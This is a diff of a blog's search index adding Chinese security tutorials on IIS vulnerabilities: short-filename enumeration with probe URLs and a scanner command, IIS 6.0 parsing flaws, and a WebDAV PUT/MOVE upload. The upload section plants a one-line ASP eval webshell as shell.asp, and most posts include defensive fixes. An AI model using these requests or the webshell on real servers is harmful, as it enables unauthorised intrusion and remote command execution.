@@ -4,11 +4,61 @@
   
     
     <entry>
+      <title>IIS短文件名漏洞</title>
+      <link href="/archives/c8c55640.html"/>
+      <url>/archives/c8c55640.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>简介：Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位<br>Windows的程序访问这些文件。在cmd下输入”dir &#x2F;x”即可看到短文件名的效果。<br><img src="https://pic.888888.al/i/2023/03/04/guxund.png" alt="0"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p><p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六<br>种<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>提醒一下 IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;&#x3D;8.0版本,即使没有安装ASP.NET，通过<br>OPTIONS和TRACE方法也可以猜解成功。以下通过开启IIS6.0 ASP.NET后进行复现<br><img src="https://pic.888888.al/i/2023/03/04/gvynqo.png" alt="1"></p><p><strong>短文件名特征：</strong><br>1.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的<br>6个字符是相同的,后面的数字进行递增<br><img src="https://pic.888888.al/i/2023/03/04/gx32mj.png" alt="2"></p><p>2.后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断。<br><img src="https://pic.888888.al/i/2023/03/04/gxbx84.png" alt="3"></p><p>3.所有小写字母均转换成大写的字母</p><p>4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<br><img src="https://pic.888888.al/i/2023/03/04/gy0aai.png" alt="4"></p><p>5.长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包<br>含空格或者其他部分特殊字符,不论长度均会生成短文件。<br><img src="https://pic.888888.al/i/2023/03/04/gygmee.png" alt="5"><br>.</p><p>.</p><p>使用payload验证目标是否存在IIS短文件名漏洞,下图显示的404,说明目标存在该短文件名<br>注：* 可以匹配n个字符, n可以为0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><strong>通过浏览器访问一个存在的短文件名，会返回404状态码, 404说明该文件存在</strong><br><img src="https://pic.888888.al/i/2023/03/04/gz7ce8.png" alt="6"><br><strong>通过浏览器访问一个不存在的短文件名，会返回400状态码, 400说明该文件不存在</strong><br><img src="https://pic.888888.al/i/2023/03/04/h02alp.png" alt="7"></p><p>通过浏览器访问上面两个payload,根据返回的结果,可以说明目标存在IIS短文件漏洞</p><p>判断漏洞存在后,接下来手工详细分析猜解IIS短文件名</p><p>在网站目录下新建一个 abcde1231111.txt文件,分别访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/a*~1*/a.aspx</span><br><span class="line"></span><br><span class="line">http://upload.moonteam.com/b*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h1yjsz.png" alt="8"><br><img src="https://pic.888888.al/i/2023/03/04/h24niw.png" alt="9"><br>通过两次的提交确认了a是404 b是400 所以存在a文件开头的短文件。</p><p>通过上面的方法接着往后猜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1*/a.aspx</span><br></pre></td></tr></table></figure><p>到这文件名已经出来了，接着就是判断是目录还是文件。</p><p><img src="https://pic.888888.al/i/2023/03/04/h342vk.png" alt="10"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1/a.aspx</span><br><span class="line">````</span><br><span class="line">![11](https://pic.888888.al/i/2023/03/04/h4f1g5.png)</span><br><span class="line">判断是文件 按照a-z进行测试 404表示存在 400表示不存在 第一个字符不是a开头的文件</span><br><span class="line">```asp</span><br><span class="line">http://upload.moonteam.com/abcde*~1.a*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h517hs.png" alt="12"><br>.</p><p>.</p><p>.</p><p>第一个是字符是t开头的，接着往后测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.t*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h5pc7z.png" alt="13"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.txt*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h6lzq6.png" alt="14"></p><p>按照上面的方法依次猜解得到该短文件名的后缀是txt 短文件名为 abcde~1.txt 可以接着猜解<br>abcde1231111.txt文件名</p><p>.</p><p><strong>使用IIS短文件名扫描软件，获取目标存在哪些短文件名</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis_shortname_Scan.py http://upload.moonteam.com/</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h7dr8d.png" alt="15"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、升级.net framework</p><p>2、修改注册表键值：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem<br>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p><p>命令行关闭 fsutil behavior set disable8dot3 1</p><p>新建文件 aaaaaaaaaaaaaazzzzz.txt 已经没有短文件名了。<br><img src="https://pic.888888.al/i/2023/03/04/h8mdkg.png" alt="16"><br>**注:**此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消<br>失。如果不重新复制，已经存在的短文件名则是不会消失的。</p><p>将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到<br>c:\www。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS文件解析漏洞</title>
+      <link href="/archives/e735aa4d.html"/>
+      <url>/archives/e735aa4d.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h1><h2 id="1-基于文件名"><a href="#1-基于文件名" class="headerlink" title="1 基于文件名"></a>1 基于文件名</h2><h3 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h3><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 <strong>;</strong> 号及其后面的内容，相当于截断。</p><p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p><p><strong>iis6.0-&gt;主目录-&gt;配置 查看 这几种扩展名都是指向同一个文件</strong></p><p><strong>C:\WINDOWS\system32\inetsrv\asp.dll 所以都解析成asp</strong><br><img src="https://pic.888888.al/i/2023/03/04/gp15me.png" alt="0"></p><h3 id="1-2复现"><a href="#1-2复现" class="headerlink" title="1.2复现"></a>1.2复现</h3><p>通过文件上传，或者创建文件，格式为*.asp;.jpg<br><img src="https://pic.888888.al/i/2023/03/04/gpxqs6.png" alt="1"></p><h3 id="1-3防御"><a href="#1-3防御" class="headerlink" title="1.3防御"></a>1.3防御</h3><p><strong>1.禁止创建和上传此类畸形文件</strong></p><p><strong>2.图片存放目录设置成禁止脚本文件执行</strong></p><p><strong>3.升级iis版本</strong></p><h2 id="2-基于文件夹"><a href="#2-基于文件夹" class="headerlink" title="2 基于文件夹"></a>2 基于文件夹</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>该版本默认将 *.asp&#x2F; 目录下的所有文件当成Asp解析。</p><h3 id="2-2复现"><a href="#2-2复现" class="headerlink" title="2.2复现"></a>2.2复现</h3><p>创建文件.asp文件夹 上传图片格式后门到此目录<br><img src="https://pic.888888.al/i/2023/03/04/gsbdx0.png" alt="2"></p><h3 id="2-3防御"><a href="#2-3防御" class="headerlink" title="2.3防御"></a>2.3防御</h3><p><strong>1.禁止创建此类文件夹</strong></p><p><strong>3.升级iis版本</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>IIS任意文件写入漏洞</title>
       <link href="/archives/1f4414ad.html"/>
       <url>/archives/1f4414ad.html</url>
       
-        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/03/04/fomu4q.png" alt="0"><br><img src="https://pic.888888.al/i/2023/03/04/fr28m6.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/03/04/fsprkx.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/gjfi01.png" alt="3"></p><p>shell.asp写入成功。</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/03/04/fomu4q.png" alt="0"><br><img src="https://pic.888888.al/i/2023/03/04/fr28m6.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/03/04/fsprkx.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/gjfi01.png" alt="3"></p><p>shell.asp写入成功。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><strong>1.关闭webdav</strong><br><strong>2.关闭写入权限</strong></p>]]></content>
       
       
       <categories>
